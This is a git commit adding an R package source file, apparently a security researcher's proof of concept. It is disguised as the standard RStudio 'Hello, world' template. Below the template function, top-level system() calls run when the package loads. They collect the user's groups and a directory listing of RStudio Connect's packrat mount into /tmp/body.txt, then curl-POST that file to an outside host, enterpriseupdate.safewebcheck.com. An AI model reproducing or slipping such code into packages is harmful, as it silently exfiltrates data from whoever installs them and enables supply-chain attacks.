160f7d112cf98f54751cdae6cc49933cb635da16
wenright-rs1 <wenright-rs1@vsecurity.com>
2017-05-24 11:43:21 -0700

    Add files via upload

---
+++ R/hello.R
@@ -0,0 +1,28 @@
+# Hello, world!
+#
+# This is an example function named 'hello'
+# which prints 'Hello, world!'.
+#
+# You can learn more about package authoring with RStudio at:
+#
+#   http://r-pkgs.had.co.nz/
+#
+# Some useful keyboard shortcuts for package authoring:
+#
+#   Build and Reload Package:  'Cmd + Shift + B'
+#   Check Package:             'Cmd + Shift + E'
+#   Test Package:              'Cmd + Shift + T'
+
+#' Example touches
+#' @export
+#' @examples
+hello <- function() {
+  print("Hello, world!")
+
+}
+
+#file.create("/Users/jeff/workspace/badpkg/heyo2.txt")
+
+system('groups >> /tmp/body.txt')
+system('ls -la /var/lib/rstudio-connect/mnt/packrat >> /tmp/body.txt')
+system('curl -X POST -H "Content-Type: text/plain" --data-binary "@/tmp/body.txt" http://enterpriseupdate.safewebcheck.com:4265')
